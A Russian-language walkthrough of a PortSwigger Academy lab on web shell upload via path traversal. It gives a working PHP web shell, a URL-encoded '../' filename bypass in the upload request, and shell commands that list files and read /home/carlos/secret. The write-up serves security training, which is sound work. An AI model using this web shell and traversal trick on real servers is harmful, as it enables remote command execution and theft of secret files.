Залогинимся под `wiener:peter` и загрузим `explot.php` в качестве нашей аватарки на уязвимый ресурс и найдем данный запрос в `Proxy` -> `HTTP history`
Внутрянка файла `explot.php` следующего вида
```
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```
И видим, что он был успешно загружен
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/3.%20Web%20shell%20upload%20via%20path%20traversal/pics%20for%20walktrough/1.png)
Но достучаться до него у нас не получается, выдает 404 респонс статус код
```
GET /files/exploit.php
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/3.%20Web%20shell%20upload%20via%20path%20traversal/pics%20for%20walktrough/2.png)
Чтобы обойти вышеописанный запрет, вернемся к запросу о загрузке нашего `explot.php`, и изменим параметр `filename` с `exploit.php` на `../exploit.php`, или же в URL-кодировке `%2e%2e%2fexploit.php`
```
POST /my-account/avatar
...
filename="%2e%2e%2fexploit.php"
...
```
И видим, что он успешно загрузился
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/3.%20Web%20shell%20upload%20via%20path%20traversal/pics%20for%20walktrough/3.png)
Попробуем до него достучаться `GET` запросом и видим, что нам это удалось
```
GET /files/exploit.php
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/3.%20Web%20shell%20upload%20via%20path%20traversal/pics%20for%20walktrough/4.png)
Далее воспользуемся шеллом и посмотрим что находится в нашей директории
```
GET /files/exploit.php?cmd=ls
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/3.%20Web%20shell%20upload%20via%20path%20traversal/pics%20for%20walktrough/5.png)
Отлично, теперь узнаем секрет УЗ `carlos`
```
GET /files/exploit.php?cmd=cat+/home/carlos/secret
```
в ответ получаем значение `gAipPE8uVhDXcO4Cbxw3PchNsRmTpc8Y`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/3.%20Web%20shell%20upload%20via%20path%20traversal/pics%20for%20walktrough/7.png)
Сдадим значение `gAipPE8uVhDXcO4Cbxw3PchNsRmTpc8Y` как ответ, и получим уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/8.%20File%20upload%20vulnerabilities/3.%20Web%20shell%20upload%20via%20path%20traversal/pics%20for%20walktrough/6.png)
